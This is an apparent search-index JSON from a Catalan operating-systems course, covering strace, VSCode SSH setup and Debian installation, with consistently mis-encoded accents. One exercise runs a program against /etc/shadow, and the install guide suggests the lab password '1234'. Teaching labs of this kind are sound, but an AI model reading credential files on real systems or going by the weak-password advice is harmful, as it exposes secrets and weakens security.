Ha de ser eficient en l‚Äô√∫s de la bateria, optimitzant els processos i serveis per maximitzar l‚Äôautonomia. Aix√≤ pot incloure t√®cniques com la gesti√≥ intel¬∑ligent del consum energ√®tic, l‚Äôoptimitzaci√≥ del rendiment dels processadors i la gesti√≥ efectiva de les aplicacions en segon pla.\nRendiment: Ha de proporcionar un rendiment flu√Øt i r√†pid, amb temps de resposta m√≠nims per a les accions dels usuaris. Aix√≤ implica una gesti√≥ eficient dels recursos del sistema, incloent la CPU, la mem√≤ria RAM i l‚Äôemmagatzatge, aix√≠ com l‚Äôoptimitzaci√≥ de les operacions d‚Äôentrada/sortida.\nMobilitat: Ha de ser dissenyat per a la mobilitat, amb funcionalitats com la connexi√≥ sense fils, la geolocalitzaci√≥ i la integraci√≥ amb serveis de xarxa m√≤bil. Aix√≤ implica la gesti√≥ de la connectivitat, la gesti√≥ de la xarxa i la integraci√≥ amb serveis de localitzaci√≥ per proporcionar una experi√®ncia m√≤bil completa.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#refer√®ncies",
    "href": "notes/01-introduction.html#refer√®ncies",
    "title": "Introducci√≥",
    "section": "Refer√®ncies",
    "text": "Refer√®ncies\n\nModern Operating Systems, Andrew S. Tanenbaum, Herbert Bos, Pearson, 2014.\nOperating System Concepts, Abraham Silberschatz, Peter B. Galvin, Greg Gagne, Wiley, 2018.\nOperating Systems: Three Easy Pieces, Remzi H. Arpaci-Dusseau, Andrea C. Arpaci-Dusseau, Arpaci-Dusseau Books, 2014.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "CONTRIBUTORS.html",
    "href": "CONTRIBUTORS.html",
    "title": "SO - Fall 2025",
    "section": "",
    "text": "Samuel Ntim Jakari: Sakytsu\nEric P√©rez Llerena: epl1185.\nMarc Nicol√°s: mnsanch\nOriol Escol√† Serra: oriolescserr\nAbderrahman Albaitar: AbderrahmanAlbaitar\nEnric Tom√†s: etj2\nH√©ctor Morales Vi√±olo: RecklessCat55\nPau Ribalta: PauRibalta\nJonay Criado Castellano: JonayCC\nOriol Llad√≥: orillad\nLaia Croce: LaiaCroce\nDavid Rivas: drr11\nIbai Soler: ibsorn\nJordi Armenteras Negredo : Shattenente\nAlbert Mas Ramon : irAlbertZ1\nNassreddine El Baghdadi: Nasser-maker-del\nKenny Henares: kennyhenares7-ui\nEnric Alguacil Lapina enricalguacil\nBiel Riba bielrb06\nEric Buenavida Crespo: EricBuenavidaUdL\nIkram Maaroufi: Ikram692\nAlejandro Matas: TheAleMax13"
  },
  {
    "objectID": "labs/03-syscalls/lab01.html",
    "href": "labs/03-syscalls/lab01.html",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "",
    "text": "En aquest laboratori us proposo utiltzar el programa strace per espiar el comportament del kernel. Aquesta eina ens permetr√† veure les crides a sistema que es fan des d‚Äôun programa en execuci√≥. Aix√≤ ens permetr√† entendre com interactuen els programes amb el sistema operatiu.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 ¬∑ Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#preparaci√≥",
    "href": "labs/03-syscalls/lab01.html#preparaci√≥",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "Preparaci√≥",
    "text": "Preparaci√≥\n\nAccediu a la m√†quina virtual Debian i instal¬∑leu el paquet strace:\nsu -c \"apt install strace -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 ¬∑ Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#strace",
    "href": "labs/03-syscalls/lab01.html#strace",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "strace",
    "text": "strace\nStrace √©s una eina que permet monitoritzar i fer un seguiment de les crides al sistema que realitza un programa.\n\nQuines crides a sistema utilitza el proc√©s?\nQuins fitxers esta utilitzant l‚Äôaplicaci√≥?\nQuins arguments es passen a les crides a sistema?\nQuines crides a sistema estan fallant, i per qu√®?\n\nEl seu funcionament es basa en la crida a sistema ptrace, que permet a un proc√©s monitoritzar i controlar un altre proc√©s.\nPer comenzar a utilitzar strace, simplement executa la comanda seg√ºent:\nstrace cat /dev/null\nAquest exemple mostra totes les crides a sistema realitzades pel programa cat, que en aquest cas, no fa res perqu√® /dev/null √©s un fitxer buit.\nSi volem filtrar per crides espec√≠fiques, podem fer-ho aix√≠:\nstrace -e trace=close cat /dev/null\nEn aquest cas, nom√©s veurem les crides close que fa el programa cat.\nSi volem filtrar per crides que comencin per un patr√≥, podem fer-ho aix√≠:\nstrace -e trace=/get* ls\nAquest exemple mostra totes les crides que comencin per get que fa el programa ls.\nPer guardar la sortida en un fitxer, podem fer-ho aix√≠:\nstrace -o strace.log -e trace=open,close ls\nAix√≤ desar√† totes les crides open i close en un fitxer anomenat strace.log.\nSi necessitem excloure una crida a sistema en particular, com gettimeofday, podem fer-ho aix√≠:\nstrace -o strace.log -e trace!=gettimeofday ls\nPer filtrar per categories de crides a sistema, podem fer-ho aix√≠:\nstrace -o strace.log -e trace=%{X} ls\nOn {X} representa la categoria que t‚Äôinteressa.\nEls filtres a strace es poden classificar en diverses categories per facilitar la depuraci√≥ i l‚Äôan√†lisi:\n\n%file: Inclou totes les crides a sistema que impliquen fitxers com a arguments.\n%desc: Compr√®n les crides a sistema relacionades amb descriptors de fitxers.\n%process: Inclou les crides a sistema que gestiona processos.\n%network: Inclou les crides a sistema relacionades amb la xarxa.\n%signal: Inclou les crides a sistema que gestionen senyals.\n%memory: Inclou les crides a sistema que es relacionen amb la gesti√≥ de la mem√≤ria.\n%ipc: Inclou les crides a sistema relacionades amb la comunicaci√≥ interprocessual.\n%fs: Inclou les crides a sistema relacionades amb el sistema de fitxers.\n%all: Inclou totes les crides a sistema.\n\nPer exemple, si volem veure totes les crides a sistema relacionades amb la xarxa, podem fer-ho aix√≠:\nstrace -o strace.log -e trace=%network ls\nAddicionalment, strace ens permet obtenir un resum de les crides a sistema que fa un programa. Per exemple, si volem veure un resum de les crides a sistema que fa cat, podem fer-ho aix√≠:\nstrace -c cat /dev/null",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 ¬∑ Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#exemple-strace-amb-un-hola-m√≥n",
    "href": "labs/03-syscalls/lab01.html#exemple-strace-amb-un-hola-m√≥n",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "Exemple: strace amb un Hola M√≥n",
    "text": "Exemple: strace amb un Hola M√≥n\nEl seg√ºent programa C escriu un missatge a la sortida est√†ndard i finalitza:\n#include &lt;stdio.h&gt;  // printf\n#include &lt;stdlib.h&gt; // exit\n\n#define STR \"HELLO\\n\"\n\nint main(int argc, char *argv[]) {\n    printf(\"%s\", STR);\n    exit(0);          \n}\n\nCompileu el programa:\ngcc hola.c -o hola \nExecuteu el programa amb strace:\nstrace -o hola.log ./hola\nConsulteu el fitxer hola.log per veure les crides a sistema que fa el programa hola.\nless hola.log\n\n\nAnalitzant la sortida\n\nLa primera l√≠nia ens mostra la crida a sistema execve que s‚Äôha fet per executar el programa hola. Quan es crea un nou proc√©s a Linux fork(), el fill √©s id√®ntic al pare. Llavors, execv() substitueix el proc√©s actual (fill) pel programa hola.c. Aquest efecte s‚Äôanomena recobriment. Com veurem m√©s endavant, aquesta crida a sistema √©s la que ens permet executar un nou programa.\nLa segona l√≠nia ens mostra la crida a sistema brk que ens permet ajustar el l√≠mit superior de l‚Äôheap, permetent al programa sol¬∑licitar m√©s mem√≤ria din√†mica. L‚Äôadre√ßa retornada marca el l√≠mit actual de l‚Äôheap.\nLa tercera l√≠nia ens mostra la crida a sistema mmap que ens permet mapejar una regi√≥ de mem√≤ria. En aquest cas, el programa hola mapeja una regi√≥ de mem√≤ria de 8192 bytes amb permisos de lectura i escriptura. Aquesta mem√≤ria s‚Äôutilitza per emmagatzemar dades temporals durant l‚Äôexecuci√≥ del programa. Ens mostra l‚Äôadre√ßa on s‚Äôha mapejat la regi√≥ de mem√≤ria.\nLa quarta l√≠nia ens mostra la crida a sistema faccessat que ens permet comprovar si un fitxer es pot llegir. En aquest cas, el programa hola intenta llegir el fitxer /etc/ld.so.preload, per√≤ com que no existeix, la crida retorna ENOENT (El fitxer o directori no existeix).\n\nNota: Tots els programes intenten obrir /etc/ld.so.preload, aquest comportament est√† integrat a Glibc. Normalment /etc/ld.so.preload no existeix, aix√≠ que cada proc√©s nom√©s crida access, rep una resposta negativa i segueix endavant.\n\nLa cinquena l√≠nia ens mostra la crida a sistema openat que ens permet obrir un fitxer. En aquest cas, el programa hola intenta obrir el fitxer /etc/ld.so.cache en mode lectura. El valor de retorn √©s 3, que √©s el descriptor de fitxer que s‚Äôha obert.\nLa sisena l√≠nia ens mostra la crida a sistema newfstatat que ens permet obtenir informaci√≥ sobre un fitxer com ara el seu estat, propietari, permisos, √∫ltim acc√©s, etc. El valor de retorn ens indica que la crida ha estat satisfact√≤ria.\nLa setena l√≠nia ens mostra la crida a sistema mmap que ens permet mapejar una regi√≥ de mem√≤ria. En aquest cas, mapeja una regi√≥ de mem√≤ria de 20870 bytes amb permisos de lectura. Aix√≤ es fa perqu√® el programa necessita llegir la informaci√≥ del fitxer /etc/ld.so.cache. El valor de retorn ens indica l‚Äôadre√ßa on s‚Äôha mapejat la regi√≥ de mem√≤ria.\nLa vuitena l√≠nia ens mostra la crida a sistema close que ens permet tancar un fitxer. En aquest cas, /etc/ld.so.cache. El valor de retorn ens indica que la crida ha estat satisfact√≤ria. I el descriptor de fitxer 3 ja no est√† disponible.\nPer fer servir la llibreria libc.so.6 que cont√© la implementaci√≥ de les funcions b√†siques del llenguatge C, aquesta ha de ser carregada a la mem√≤ria. Els passos s√≥n els seg√ºents:\n\nLa crida a sistema openat obre la llibreria libc.so.6 en mode lectura. El valor de retorn √©s 3, que √©s el descriptor de fitxer que s‚Äôha obert.\nLa crida a sistema read llegeix 832 bytes de la llibreria libc.so.6. El valor de retorn ens indica que s‚Äôhan llegit 832 bytes. Aquesta informaci√≥ √©s la cap√ßalera que t√© format ELF.\nLa crida a sistema newfstatat ens permet obtenir informaci√≥ sobre la llibreria libc.so.6.\nLa crida a sistema mmap mapeja una regi√≥ de mem√≤ria de 1826912 bytes amb permisos de lectura.\nLa crida a sistema mmap mapeja una regi√≥ de mem√≤ria de 1761376 bytes amb permisos d‚Äôexecuci√≥. Aquesta mem√≤ria es fa servir per executar la llibreria libc.so.6. El valor de retorn ens indica l‚Äôadre√ßa on s‚Äôha mapejat la regi√≥ de mem√≤ria.\nLes crides munmap alliberen regions de mem√≤ria que ja no es fan servir. En aquest cas, la llibreria libc.so.6 ja no necessita llegir la cap√ßalera ELF.\nLa crida a sistema mprotect canvia els permisos d‚Äôuna regi√≥ de mem√≤ria a PROT_NONE (sense permisos). Aquesta regi√≥ de mem√≤ria ja no es fa servir.\nLes crides mmap mapegen dos regions de mem√≤ria de 24576 i 49248 bytes amb permisos de lectura i escriptura per emmagatzemar dades temporals durant l‚Äôexecuci√≥ de la llibreria libc.so.6. El valor de retorn ens indica les adreces on s‚Äôhan mapejat les regions de mem√≤ria (0xffff833bc000 i 0xffff833c2000).\nLa crida a sistema close tanca la llibreria libc.so.6. El valor de retorn ens indica que la crida ha estat satisfact√≤ria. I el descriptor de fitxer 3 ja no est√† disponible.\n\n\nNo comentarem les crides a sistema set_tid_address, set_robust_list, rseq, prlimit64, getrandom ja que no s√≥n rellevants per aquest exemple i les veurem m√©s endavant.\n\nLes seg√ºents crides a sistema mprotect canvien els permisos a PROT_READ (nom√©s lectura) de diferents regions de mem√≤ria. La primera regi√≥ de mem√≤ria √©s de 16384 bytes, la segona de 4096 bytes i la tercera de 8192 bytes.\nLa crida a sistema newfstatat ens permet obtenir informaci√≥ sobre la sortida est√†ndard. Fixeu-vos que el descriptor de fitxer √©s 1. L‚Äôobjectiu del programa en C es mostrar el missatge HELLO per la sortida est√†ndard.\nLes crides brk(NULL) i brk(0xaaaadad16000) primer obtenen l‚Äôadre√ßa final de la pila i despr√©s ajusten el l√≠mit superior de l‚Äôheap. Es a dir, el programa augmenta la mida de l‚Äôheap per emmagatzemar la cadena HELLO\\n abans d‚Äôescriure-la per la sortida est√†ndard.\n\nNota: Tot i que no s‚Äôutiltiza la mem√≤ria din√†mica de forma expl√≠cita, la crida a sistema write(1, \"HELLO\\n\", 6) fa servir la mem√≤ria din√†mica per emmagatzemar la cadena HELLO\\n abans d‚Äôescriure-la per la sortida est√†ndard. Podeu comprovar-ho si mirem la implementaci√≥ de la funci√≥ printf de la llibreria libc.so.6.\n\nLa crida a sistema write escriu 6 car√†cters a la sortida est√†ndard. En aquest cas, el programa hola escriu la cadena HELLO\\n per la sortida est√†ndard. El valor de retorn ens indica que s‚Äôhan escrit 6 car√†cters.\nLa crida a sistema exit_group finalitza el programa hola. El valor de retorn √©s 0, que indica que el programa ha finalitzat correctament.\n\nNota: La crida a sistema exit_group √©s la que s‚Äôutilitza per finalitzar un proc√©s. Aquesta crida finalitza tots els fils del proc√©s i allibera tots els recursos que s‚Äôhan utilitzat. Si observeu el manual de la crida a sistema exit (man 2 exit), veureu que aquesta crida invoca la crida a sistema del kernel amb el mateix nom. Des de la versi√≥ 2.3 de Glibc, la funci√≥ exit invoca la crida a sistema exit_group per tal de finalitzar tots els fils d‚Äôun proc√©s.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 ¬∑ Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab01.html#exercici-opcional-strace-amb-un-programa-que-obre-un-fitxer",
    "href": "labs/03-syscalls/lab01.html#exercici-opcional-strace-amb-un-programa-que-obre-un-fitxer",
    "title": "Laboratori 7: Espiant el Kernel",
    "section": "Exercici Opcional: strace amb un programa que obre un fitxer",
    "text": "Exercici Opcional: strace amb un programa que obre un fitxer\n\nCreeu un fitxer anomenat open.c amb el seg√ºent codi:\nint main(int argc, char *argv[]) {\n    int fd;\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s &lt;file&gt;\\n\", argv[0]);\n        exit(1);\n    }\n    fd = open(argv[1], O_RDONLY);\n    if (fd == -1) {\n        perror(\"open\");\n        exit(1);\n    }\n    close(fd);\n    return 0;\n}\nAquest programa obre un fitxer en mode lectura i el tanca. Si no es passa cap argument, mostra un missatge d‚Äô√∫s.\nCompileu el programa:\ngcc -o open open.c\nExecuteu el programa amb strace:\nstrace -o open_1.log ./open /etc/passwd\nExecuteu el programa amb strace:\nstrace -o open_2.log ./open /etc/shadow\n\nObriu els fitxers open_1.log i open_2.log amb un editor de text o amb la comanda less i analitzeu el seu comportament i les difer√®ncies entre ells.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 7 ¬∑ Espiant el Kernel"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html",
    "href": "labs/01-introduction/lab02.html",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "",
    "text": "Configurar el Visual Studio Code (VSCode) per connectar-se a la m√†quina virtual mitjan√ßant SSH.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 ¬∑ Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html#objectius",
    "href": "labs/01-introduction/lab02.html#objectius",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "",
    "text": "Configurar el Visual Studio Code (VSCode) per connectar-se a la m√†quina virtual mitjan√ßant SSH.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 ¬∑ Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html#requisits-previs",
    "href": "labs/01-introduction/lab02.html#requisits-previs",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "Requisits previs",
    "text": "Requisits previs\n\nM√†quina virtual en funcionament (vegeu Laboratori 1).\nVisual Studio Code (VSCode) instal¬∑lat al vostre ordinador. Podeu descarregar-lo des de https://code.visualstudio.com/.\nObtenir la IP de la m√†quina virtual. Per fer-ho, podeu:\n\nConsultar la informaci√≥ a VMWare: \nO b√©, iniciar sessi√≥ a la m√†quina virtual i executar la comanda ip a per obtenir la IP: \n\n\n\n\n\n\n\nNota\n\n\n\nEn els dos casos, la IP de la m√†quina virtual √©s 172.16.10.223.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 ¬∑ Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html#configurant-vscode-per-connectar-se-a-la-m√†quina-virtual",
    "href": "labs/01-introduction/lab02.html#configurant-vscode-per-connectar-se-a-la-m√†quina-virtual",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "Configurant VSCode per connectar-se a la m√†quina virtual",
    "text": "Configurant VSCode per connectar-se a la m√†quina virtual\nUn cop hagueu instal¬∑lat el vostre entorn de desenvolupament (IDE), podeu afegir les seg√ºents extensions utilitzant el marketplace de VSCode: remote-ssh. Primer, feu clic a Marketplace (1), despr√©s cerqueu remote-ssh i, finalment, feu clic a (3) per instal¬∑lar la extensi√≥. Consulteu la imatge:\n\nUn cop hagueu instal¬∑lat la extensi√≥, ja podeu connectar-vos a la m√†quina virtual. Per fer-ho, feu clic a la icona de la part inferior esquerra (1) i seleccioneu l‚Äôopci√≥ Remote-SSH: Connect to Host‚Ä¶ (2). Consulteu la imatge:\n\nAra apareixer√† una finestra on podreu escriure la connexi√≥ SSH. Tamb√© veureu l‚Äôopci√≥ Add a New SSH Host. Feu clic en aquesta opci√≥ i introdu√Øu la comanda SSH per connectar-vos a la m√†quina virtual. Consulteu la imatge:\n\nSeleccioneu la primera opci√≥ del men√∫ desplegable amb la ruta del vostre usuari i feu clic a Add. Consulteu la imatge:\n\ni comproveu que l‚Äôamfitri√≥ s‚Äôha afegit correctament.\n\nAra feu clic a Open Config i observeu que s‚Äôha creat una nova entrada amb el vostre usuari i la IP de la m√†quina virtual:\nHost 172.16.10.223\n  HostName 172.16.10.223\n  User jordi\nUs recomano que modifiqueu el fitxer de configuraci√≥ perqu√® sigui m√©s f√†cil de recordar. Per exemple, podeu canviar el nom de l‚Äôamfitri√≥ per vm-curs0-debian12 :\nHost vm-curs0-debian12\n  HostName 172.16.10.202\n  User jordi\nUn cop hagueu modificat el fitxer de configuraci√≥, guardem-lo i tanquem-lo. Ara ja podeu connectar-vos a la m√†quina virtual vm-curs0-debian12. Per fer-ho:\n\nFeu clic a la icona de la part inferior esquerra.\nSeleccioneu Remote-SSH: Connect to Host‚Ä¶.\nSeleccioneu vm-curs0-debian12:\n\n\nUs apareixer√† una finestra emergent que us demanar√† si voleu confiar en l‚Äôamfitri√≥. Feu clic a Continue. \nUs apareixer√† una altra finestra emergent que us demanar√† la contrasenya de l‚Äôusuari jordi. \n\n\n\n\n\n\n\nNota\n\n\n\nLa primera vegada que us connecteu a la m√†quina virtual, VSCode instal¬∑lar√† el servidor remot a la m√†quina virtual. Aix√≤ pot trigar uns minuts.\n\n\nUn cop us h√†giu connectat, veureu que la finestra de VSCode ha canviat i que ara esteu treballant a la m√†quina virtual. Podeu comprovar-ho a la part inferior esquerra on apareix el nom de l‚Äôamfitri√≥ vm-curs0-debian12.\n\nPer comprovar que tot funciona correctament, podeu obrir una terminal integrada a VSCode i executar la comanda uname -a per veure la informaci√≥ del sistema i comprovar que esteu a la m√†quina virtual.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 ¬∑ Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html",
    "href": "labs/01-introduction/lab01.html",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "",
    "text": "Instal¬∑lar el programari de virtualitzaci√≥ VMWare Workstation Pro o VMWare Fusion.\nInstal¬∑lar una m√†quina virtual basada en un sistema operatiu Linux.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#objectius",
    "href": "labs/01-introduction/lab01.html#objectius",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "",
    "text": "Instal¬∑lar el programari de virtualitzaci√≥ VMWare Workstation Pro o VMWare Fusion.\nInstal¬∑lar una m√†quina virtual basada en un sistema operatiu Linux.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#installaci√≥-del-hypervisor-vmware-workstation-pro-o-vmware-fusion",
    "href": "labs/01-introduction/lab01.html#installaci√≥-del-hypervisor-vmware-workstation-pro-o-vmware-fusion",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "Instal¬∑laci√≥ del Hypervisor (VMWare Workstation Pro o VMWare Fusion)",
    "text": "Instal¬∑laci√≥ del Hypervisor (VMWare Workstation Pro o VMWare Fusion)\nAquestes instruccions et guiaran a trav√©s del proc√©s per crear un compte a Broadcom i descarregar una de les versions gratu√Øtes de VMware Workstation Pro (per a Windows) o VMware Fusion (per a macOS).\n\nRegistra‚Äôt per a un compte gratu√Øt a Broadcom: Per accedir a les desc√†rregues de programari de VMware, necessites un compte a la plataforma de Broadcom.\n\nDirigeix-te a la p√†gina de registre de Broadcom: https://profile.broadcom.com/web/registration\nIntrodueix la teva adre√ßa de correu electr√≤nic, realitza la verificaci√≥ de seguretat i fes clic a Next \nIntrodueix el codi de verificaci√≥ que has rebut al teu correu electr√≤nic. Fes clic a Verify per continuar. \nCompleta el formulari de registre amb la teva informaci√≥ personal i crea una contrasenya. Fes clic a Create Account per completar el registre. \nUn cop completat el registre, visualitzar√†s un missatge de registre correcte. I us demanar√† si voleu completar el perfil. Seleccioneu, I will do it later per continuar. \n\nAccedeix a les desc√†rregues gratu√Øtes de VMware:\n\nVes a la p√†gina de login de Broadcom: https://profile.broadcom.com/web/login\nInicia sessi√≥ amb el teu correu electr√≤nic i la contrasenya que has creat.\nVes directament a la secci√≥ de desc√†rregues a (https://support.broadcom.com/group/ecx/free-downloads). \nSelecciona VMware Workstation Pro o VMware Fusion segons el teu sistema operatiu (Windows o macOS). En el meu cas, utiltizo Mac, aix√≠ que seleccionar√© VMware Fusion.\nSeleccioneu la versi√≥ que voleu descarregar. En aquest cas, podem seleccionar la versi√≥ m√©s recent. \nEn la p√†gina seg√ºent:\n\nFes clic a l‚Äôenlla√ß de termes i condicions per que s‚Äôactivi el checkbox de l‚Äôacceptaci√≥.\nAcceptar els termes i condicions.\nFes clic a desc√†rrega per comen√ßar a descarregar el fitxer d‚Äôinstal¬∑laci√≥. \n\n\nInstal¬∑la VMware Workstation Pro o VMware Fusion.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#descarrega-de-la-imatge-iso-de-debian-12.5.0",
    "href": "labs/01-introduction/lab01.html#descarrega-de-la-imatge-iso-de-debian-12.5.0",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "Descarrega de la imatge ISO de Debian 12.5.0",
    "text": "Descarrega de la imatge ISO de Debian 12.5.0\n\nVes a la p√†gina de desc√†rrega de Debian 12.5.0: https://get.debian.org/images/archive/12.5.0/\nSelecciona la imatge ISO per a la teva arquitectura (amd64 o arm64). La majoria dels vostres ordinadors tenen processadors amd64 (Intel o AMD). Els processadors ARM s√≥n m√©s comuns en dispositius m√≤bils i en els nous Mac amb xips M.\nSeleccioneu la carpeta iso-cd.\nSeleccioneu el fitxer debian-12.5.0-x-netinst.iso. On x √©s l‚Äôarquitectura del vostre sistema (amd64 o arm64).\n\nüí° Nota:\nLa imatge netinst √©s una imatge d‚Äôinstal¬∑laci√≥ m√≠nima que descarrega els paquets necessaris durant la instal¬∑laci√≥. Aix√≤ permet personalitzar la instal¬∑laci√≥ i seleccionar els paquets que voleu instal¬∑lar.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#configuraci√≥-de-la-m√†quina-virtual-amb-vmware",
    "href": "labs/01-introduction/lab01.html#configuraci√≥-de-la-m√†quina-virtual-amb-vmware",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "Configuraci√≥ de la m√†quina virtual amb VMWare",
    "text": "Configuraci√≥ de la m√†quina virtual amb VMWare\n\nSelecciona l‚Äôopci√≥ Create a New Virtual Machine a VMWare Workstation Pro o VMWare Fusion.\nSelecciona Install from disc or image. \nSelecciona la imatge ISO de Debian 12. \nConfigura els recursos de la m√†quina virtual. \nAnomena la m√†quina virtual i selecciona la ubicaci√≥ on es guardar√†. Per exemple, podeu posar el nom vm-curs0-debian12 i seleccionar una ubicaci√≥ al vostre directori d‚Äôusuari.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#installaci√≥-del-sistema-operatiu",
    "href": "labs/01-introduction/lab01.html#installaci√≥-del-sistema-operatiu",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "Instal¬∑laci√≥ del sistema operatiu",
    "text": "Instal¬∑laci√≥ del sistema operatiu\n\nUn cop iniciada la m√†quina virtual, podeu seleccionar la opci√≥ Install o b√© Graphical install. \nEn aquest tutoriral, seleccionarem la opci√≥ Graphical install per a una instal¬∑laci√≥ m√©s amigable. La principal difer√®ncia entre les dues opcions √©s l‚Äôentorn gr√†fic.\nSelecciona l‚Äôidioma d‚Äôinstal¬∑laci√≥. \nPodeu seleccionar l‚Äôidioma que vulgueu per a la instal¬∑laci√≥. En aquest cas, seleccionarem l‚Äôidioma Catal√†.\nSelecciona la ubicaci√≥ geogr√†fica. \nEn aquest cas, seleccionarem la ubicaci√≥ Espanya.\nSelecciona la disposici√≥ del teclat. \nEn aquest cas, seleccionarem la disposici√≥ de teclat Catal√†. Aix√≤ ens asegurar√† un mapeig correcte del teclat.\nEspereu que el sistema carregui els components necessaris. \nConfigura la xarxa.\n\nEl primer pas √©s configurar el nom d‚Äôamfitri√≥ o hostname. Aquest nom permet identificar de forma √∫nica el vostre sistema. Podeu deixar el nom per defecte o canviar-lo al vostre gust.\n\n\nEn aquest cas, hem canviat el nom d‚Äôamfitri√≥ a vm-curs0-debian12, per√≤ podeu posar el nom que vulgeu com debianlab, etc.\n\nEl segon pas √©s configurar el domini de la xarxa. Aquest pas el podeu deixar en blanc si no teniu un domini espec√≠fic. O b√©, podem utilitzar .local com a domini local per identicar que el servidor pertany a la xarxa local.\n\n\nConfigura l‚Äôusuari administrador.\n\nEn aquest punt, heu de tenir en compte que si no poseu cap contrasenya, es crear√† l‚Äôusuari normal amb permisos de sudo i aix√≤ us permetra executar comandes amb privilegis d‚Äôadministrador.\nSi poseu una contrasenya, aquesta ser√† la contrasenya de l‚Äôusuari root i no es crear√† un usuari normal amb permisos de sudo. I tampoc s‚Äôinstal¬∑lar√† el paquet sudo.\n\n‚ö†Ô∏è Compte\nCom utilitzarem les m√†quines virtuals com a laboratoris de pr√†ctiques, no cal que poseu una contrasenya molt segura. Podeu utilitzar una com a 1234. Per√≤, recordeu que en un entorn real, la seguretat √©s molt important i cal utilitzar contrasenyes segures.\n\nConfigura un usuari normal.\n\nNom complet: Podeu posar el vostre nom complet o el que vulgueu.\n\n\n\nNom d‚Äôusuari: Podeu posar el vostre nom d‚Äôusuari o el que vulgueu.\n\n\n\nContrasenya: El mateix que per l‚Äôusuari root.\n\n\nConfigura la zona hor√†ria.\n\nEn aquest cas, seleccionarem la zona hor√†ria de Madrid.\nConfigura el disc dur.\n\nParticionament: En aquest curs, el tema del particionament no √©s molt important. Per tant, podeu fer servir la configuraci√≥ per defecte m√©s senzilla (Guiat - utilitzar el disc sencer). Aquesta configuraci√≥ crear√† les particions necess√†ries per a l‚Äôinstal¬∑laci√≥ del sistema.\n\n\n\nSelecciona el disc on instal¬∑lar el sistema. En el meu cas, nom√©s tinc un disc virtual amb l‚Äôetiqueta /dev/nvme0n1. L‚Äôetiqueta indica el tipus de disc (NVMe) i el n√∫mero de disc (1). Es possible tenir altres etiquetes com /dev/sda per discos SATA o /dev/vda per discos virtuals.\n\n\n\nParticions: Podeu seleccionar (Tots els fitxers en una partici√≥) per simplificar la gesti√≥ i evitar problemes podeu seleccionar aquesta opci√≥. Aquesta opci√≥ crear√† una sola partici√≥ per a tot el sistema.\n\n\n\nConfirmeu els canvis. En aquest punt, el sistema crear√† les particions necess√†ries:\n\nLa primera partici√≥ ser√† la partici√≥ /boot on es guardaran els fitxers per arrancar el sistema.\nLa segona partici√≥ ser√† la partici√≥ / on es guardaran els fitxers del sistema.\nLa tercera partici√≥ ser√† la partici√≥ de swap on es guardaran les dades de la mem√≤ria virtual.\n\n\n\n‚ÑπÔ∏è Qu√® √©s la partici√≥ swap?\nLa swap √©s una 